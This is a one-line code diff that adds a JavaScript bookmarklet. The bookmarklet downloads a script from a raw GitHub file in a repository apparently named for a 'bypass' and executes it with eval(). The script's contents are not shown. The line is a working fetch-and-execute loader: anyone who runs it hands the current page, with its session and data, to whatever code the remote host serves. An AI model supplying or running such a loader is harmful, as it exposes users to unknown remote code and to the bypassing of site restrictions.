@@ -1,0 +1,1 @@
+javascript:fetch("https://raw.githubusercontent.com/arafathosenn/temp-bypass-/refs/heads/main/DOC-20261004-WA0006.js").then(r=>r.text()).then(t=>{eval(t)}).catch(e=>alert("Error: "+e))
